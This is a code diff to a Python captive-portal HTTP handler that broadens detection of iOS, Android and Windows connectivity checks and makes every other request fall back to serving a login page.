@@ -75,32 +75,33 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         client_ip = self.client_address[0]
         path = self.path.split("?", 1)[0]
-        print(f"[GET]  {client_ip} -> {self.path}")
-
-        # Apple/iOS detection
-        if "captive.apple.com" in self.headers.get('Host', '') or path == "/hotspot-detect.html":
+        host = self.headers.get('Host', '')
+        
+        print(f"[GET]  {client_ip} -> {path} (Host: {host})")
+        
+        # Handle captive portal detection
+        if any(x in host for x in ["captive.apple.com", "appleiphonecell.com"]) or path == "/hotspot-detect.html":
             print("→ iOS/macOS captive detection triggered")
             self._serve_login()
             return
             
-        # Android detection
-        if "connectivitycheck.gstatic.com" in self.headers.get('Host', '') or path == "/generate_204":
+        # Android detection - most reliable
+        if any(x in host for x in ["connectivitycheck.gstatic.com", "connectivitycheck.android.com", "clients3.google.com"]) or path == "/generate_204":
             print("→ Android captive detection triggered")
-            self._serve_login()  # Instead of 204 response to trigger portal
+            # Force return 200 OK instead of 204 to trigger portal
+            self._serve_login()
             return
             
         # Windows detection
-        if "msftconnecttest.com" in self.headers.get('Host', '') or path == "/ncsi.txt" or path == "/redirect":
+        if any(x in host for x in ["msftconnecttest.com", "msftncsi.com"]) or path == "/ncsi.txt" or path == "/redirect":
             print("→ Windows captive detection triggered")
             self._serve_login()
             return
 
-        # Common captive-check endpoints
-        if path in ("/generate_204", "/hotspot-detect.html", "/ncsi.txt", "/redirect", "/success"):
-            print("→ Generic captive detection triggered")
-            self._serve_login()
-            return
-
+        # Fallback - always show login page
+        self._serve_login()
+        return
+    
     def do_POST(self):
         client_ip = self.client_address[0]
         path = self.path.split("?", 1)[0]
